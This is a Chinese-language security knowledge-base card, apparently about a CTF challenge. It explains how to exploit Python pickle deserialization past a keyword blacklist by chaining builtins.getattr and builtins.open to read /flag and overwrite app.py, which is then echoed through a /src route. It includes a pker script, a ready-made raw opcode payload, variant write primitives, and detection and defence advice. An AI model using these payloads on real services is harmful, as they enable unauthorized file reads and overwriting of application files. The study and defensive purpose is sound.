---
id: web-python-deserialization-pickle-builtins-open-read-write-echo-bypass
title: pickle 黑名单禁用命令执行时改用 builtins.open 读写文件：把 /flag 内容写回被 /src 回显的源码文件
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-builtins-open-read-write-echo
tags:
- python
- pickle
- deserialization
- file-read
- file-write
- blacklist-bypass
- flask
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:17:35+08:00'
  notes: 已对照原文核对（黑名单封 os/system/exec/__builtins__ 等、sys.modules[os]/[sys] 置为 not allowed、pker 生成的 cbuiltins getattr/open opcode、读 /flag 写回 ./app.py 再由 /src 回显一致）；本次核对未读取图片，仅依据正文；原文 pker 版多一次 fff=read() 中间变量，卡片合并为 write(read())，语义等价
url: /docs/web/python/deserialization/web-python-deserialization-pickle-builtins-open-read-write-echo-bypass/
draft: false
kb_aliases:
- pickle 无 RCE 读 flag
- builtins.open 写回源码文件回显
- pickle getattr open write
- 反序列化只读文件也能出 flag
---

## 一句话结论

同一个 pickle 入口里，黑名单封掉了 `os`/`system`/`exec`/`__builtins__` 等命令执行面、且 `sys.modules['os']`/`['sys']` 被替换成字符串时，可以完全不碰命令执行：用 `GLOBAL('builtins','getattr')` + `GLOBAL('builtins','open')` 读 `/flag`，再把内容写回应用自己会用 `/src` 路由读出来回显的源文件（如 `./app.py`），从 HTTP 响应里拿到 flag。

## 原理

- pickle 的 `GLOBAL` opcode 只需要「模块名 + 属性名」，`builtins` 与 `open`/`getattr` 都不在黑名单里，因此即使 `os`/`system` 被封也能落地文件读写原语。
- 黑名单是对 payload 解 base64 后的字节做子串匹配；`builtins`、`open`、`getattr`、`/flag` 是否命中取决于名单内容——本题名单漏了 `builtins`（只封了 `__builtins__`），于是 `cbuiltins\nopen` 直接可用。
- 读文件后需要「回显通道」。很多题的 `/src` 路由会 `open("app.py").read()` 并把源码打印出来，这就等于一个把进程内文件内容反射到 HTTP 的出口：把 flag 覆盖进 `app.py`，访问 `/src` 即读到。
- 写入用的是 `open(path, 'w')` 后 `write(data)`：`write` 不在黑名单时也能直接 `getattr(f,'write')` 取到；即使 `write` 被拦，也可用 `GLOBAL('builtins','print')` 的 `file=` 参数或 `GLOBAL('io','FileIO')` 绕开。
- 相比 RCE，这条链不依赖 `subprocess` 是否已被导入、也不依赖出网，因此在「容器禁出网 + 命令执行面被封」的环境里反而更稳。

## 触发条件

- 存在 `pickle.loads` 作用于用户可控数据（常见 base64 包裹）。
- 黑名单封住了 `os`/`system`/`exec` 等命令面，但未封 `builtins`/`open`/`getattr`（或可用等价物绕过）。
- 应用存在把某文件内容回显的路由（`/src` 打印源码、模板文件、日志查看等），且该文件进程可写。
- 进程对目标文件（源文件/模板/静态目录）有写权限。

## 利用步骤

1. 读源码：确认黑名单集合、`/src` 之类的回显路由读的是哪个文件、进程用户对该文件是否可写。
2. 用 pker 语法描述意图（也可手写 opcode）：

```python
getattr = GLOBAL('builtins', 'getattr')
open = GLOBAL('builtins', 'open')
flag = open('/flag')
read = getattr(flag, 'read')
f = open('./app.py', 'w')
write = getattr(f, 'write')
write(read())
return
```

3. 等价的成品 opcode（base64 后投递）：

```
cbuiltins
getattr
p0
0cbuiltins
open
p1
0g1
(S'/flag'
tRp2
0g0
(g2
S'read'
tRp3
0g1
(S'./app.py'
S'w'
tRp4
0g0
(g4
S'write'
tRp5
0g3
(tRp6
0g5
(g6
tR.
```

4. POST 到反序列化路由（本例 `data=` 参数），随后访问 `/src` 读取被覆盖的 `app.py`，flag 就在响应体里。
5. 变体收尾：若回显路由不存在，改成把 flag 写进静态目录（`./static/x.txt`）再从浏览器取。

## PoC

```python
import base64, pickletools
payload = b"cbuiltins\nopen\n(S'/flag'\nS'r'\ntR."   # 仅读，验证 open 可用
print(base64.b64encode(payload).decode())
```

完整读写链见上一条 opcode（无 PoC：原文未提供可直接运行的脚本，本卡按 opcode 语义整理）。

## 变体与关联

- 变体：`write` 被黑名单时，用 `GLOBAL('builtins','print')(data, file=f)` 或 `GLOBAL('io','FileIO')`/`GLOBAL('pathlib','Path')` 的 `write_text` 写文件。
- 变体：不想改动源文件时，写 `.py` 模板/静态资源；Flask 的 `static` 目录天然可回显。
- 变体：只读不写时，用 `os.listdir`→`open`→`print` 组合把内容塞进异常信息（`__reduce__` 抛错回显）或写进日志。
- 关联：[[web-python-deserialization-pickle-blacklist-miss-subprocess-run-opcode]]（同一入口的另一条路线：黑名单漏 `subprocess` 时直接命令执行；本卡的路线是命令面全封时退回文件读写）。
- 关联：[[web-python-deserialization-restricted-unpickler-getattr-bypass]]（`getattr` 作为绕过 `find_class` 允许列表的原语）。

## 检测与防御

- 防御：禁用 `pickle.loads` 处理不可信输入；必须用时以 `find_class` 白名单只放行明确类。
- 防御：不要用「关键字黑名单」防护反序列化——本条证明连 `open` 这种只读写文件的函数都能把 flag 带出来。
- 防御：进程对源码/模板目录只读；不要提供把进程内文件内容直接回显的路由。
- 检测：请求体 base64 解码后出现 `cbuiltins`、`open`、`write`、`/flag` 等 opcode 明文；`/src` 类路由被访问后返回内容异常（变成 flag 文本）；源文件 mtime 在运行期被改动。
- 响应：恢复被覆盖文件、下线反序列化入口、审计同进程其它 pickling 点。
